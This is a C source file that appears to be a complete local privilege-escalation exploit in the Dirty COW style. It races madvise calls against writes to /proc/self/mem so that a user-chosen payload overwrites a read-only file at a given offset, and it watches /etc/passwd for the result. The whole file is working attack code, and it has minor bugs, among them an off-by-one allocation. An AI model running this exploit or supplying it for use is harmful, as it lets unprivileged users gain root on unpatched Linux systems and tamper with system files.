#include <stdarg.h>
#include <stdbool.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>

#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <string.h>

#include <getopt.h>
#include <unistd.h>

#include <sys/stat.h>
#include <sys/types.h>
#include <sys/mman.h>

#define ERR_IF(cond) \
	do { \
		if (cond) {	\
			perror(__func__); \
			exit(EXIT_FAILURE); \
		} \
	} while (0)

#define ERR_IF_PTHREAD(status) \
	do { \
		int _val = status; \
		if (_val > 0) {	\
			fprintf(stderr, "%s: %s\n", __func__, strerror(_val)); \
			exit(EXIT_FAILURE); \
		} \
	} while (0)

#define VIRTUAL_MEMORY "/proc/self/mem"
#define THREAD_ITERATIONS 10000

int stop = 0;

typedef struct payload_info {
	char *payload;
	off_t offset;
	void *loc_in_mem;
	int target_fd;
	bool append;
} PayloadInfo;

// Write payload to mmap'd memory
void *writer_thread(void *arg) {
	PayloadInfo *info = arg;
	char *str = info->payload;

	int fd = open(VIRTUAL_MEMORY, O_RDWR);
	ERR_IF(fd < 0);

	for (int i = 0; i < THREAD_ITERATIONS && !stop; i++) {
		lseek(fd, (uintptr_t) info->loc_in_mem + info->offset, SEEK_SET);
		write(fd, str, strlen(str));
	}

	return NULL;
}

// Advise kernel to drop mapping
void *madviser_thread(void *arg) {
	PayloadInfo *info = arg;

	for (int i = 0; i < THREAD_ITERATIONS && !stop; i++) {
		madvise(info->loc_in_mem, 100, MADV_DONTNEED);
	}

	return NULL;
}

void *wait_for_write(void *arg) {
	PayloadInfo *info = arg;
	size_t len = strlen(info->payload);

	while (true) {
		char buf[len];
		memset(buf, '\0', len);

		int fd = open("/etc/passwd", O_RDONLY);
		ERR_IF(fd < 0);

		ERR_IF(lseek(fd, info->offset, SEEK_SET) < 0);
		ERR_IF(read(fd, buf, len) < 0);

		if (memcmp(buf, info->payload, len) == 0 && !info->append) {
			printf("Target file is overwritten\n");
			break;
		}

		// need to handle append differently

		close(fd);
		sleep(1);
	}

	stop = 1;
	printf("Stop set to 1\n"); 

	return NULL;
}

// Load Payload into string from specified file
char *read_file(char *path) {
	int fd = open(path, O_RDONLY);
	ERR_IF(fd < 0);

	struct stat file_info;
	ERR_IF(fstat(fd, &file_info) < 0);

	off_t file_size = file_info.st_size;
	char *contents = calloc(file_size + 1, sizeof(char));
	ERR_IF(read(fd, contents, file_size) != file_size);
	contents[file_size] = '\0';

	return contents;
}

void usage(FILE* stream) {
	fprintf(stream, "-f, --file  \t name of file contatining the payload\n"
	                "-s, --string\t use command line arg string as payload\n"
	                "-o, --offset\t offset postition for lseek (hex)\n"
	                "-a, --append\t append to target file\n"
	                "-h, --help  \t help print out\n\n"
	                "Target file name must be the last argument\n");
}

void die(char *fmt, ...) {
	if (fmt != NULL) {
		va_list ap;
		va_start(ap, fmt);
		vfprintf(stderr, fmt, ap);
		va_end(ap);
	}

	exit(EXIT_FAILURE);
}

off_t parse_hex(char *str) {
	unsigned int result;
	sscanf(str, "%x", &result);
	return (off_t) result;
}

PayloadInfo parse_opts(int argc, char *argv[]) {
	PayloadInfo info = {
		.offset = 0x0,
		.append = false
	};

	struct option longopts[] = {
		{"file",    required_argument, NULL, 'f' },
		{"append",  no_argument,       NULL, 'a' },
		{"string",  no_argument,       NULL, 's' },
		{"offset",  required_argument, NULL, 'o' },
		{"help",    no_argument,       NULL, 'h' },
		{0}
	};

	int c;

 	while ((c = getopt_long(argc, argv, "ahs:f:o:", longopts, NULL)) != -1) {
		switch (c) {
			case 'f':  // file containing payload
				info.payload = read_file(optarg);
				break;
			case 'o':  // offset position for payload (hex)
				info.offset = parse_hex(optarg);
				break;
			case 's':
				info.payload = malloc(strlen(optarg));
				strcpy(info.payload, optarg);
				break;
			case 'a':  // append to target file
				info.append = true;
				break;
			case 'h':
				usage(stdout);
				break;
			default: // unknown option
				usage(stderr);
				die("Unknown option: %c\n", optopt);
		}
	}

	// Open target file
	info.target_fd = open(argv[optind], O_RDONLY);
	ERR_IF(info.target_fd < 0);

	if (info.append) {
		info.offset = lseek(info.target_fd, 0, SEEK_END);
		lseek(info.target_fd, 0, SEEK_SET);
	}

	struct stat file_info;
	ERR_IF(fstat(info.target_fd, &file_info) < 0);

	info.loc_in_mem = mmap(NULL, file_info.st_size, PROT_READ, MAP_PRIVATE, info.target_fd, 0);

	return info;
}

int main(int argc, char *argv[]) {
	PayloadInfo info = parse_opts(argc, argv);

	pthread_t thread_1, thread_2, thread_3;

	ERR_IF_PTHREAD(pthread_create(&thread_1, NULL, madviser_thread, &info));
	ERR_IF_PTHREAD(pthread_create(&thread_2, NULL, writer_thread, &info));
	ERR_IF_PTHREAD(pthread_create(&thread_3, NULL, wait_for_write, &info));

	ERR_IF_PTHREAD(pthread_join(thread_1, NULL));
	ERR_IF_PTHREAD(pthread_join(thread_2, NULL));
	ERR_IF_PTHREAD(pthread_join(thread_3, NULL));

	close(info.target_fd);
	free(info.payload);

	return EXIT_SUCCESS;
}

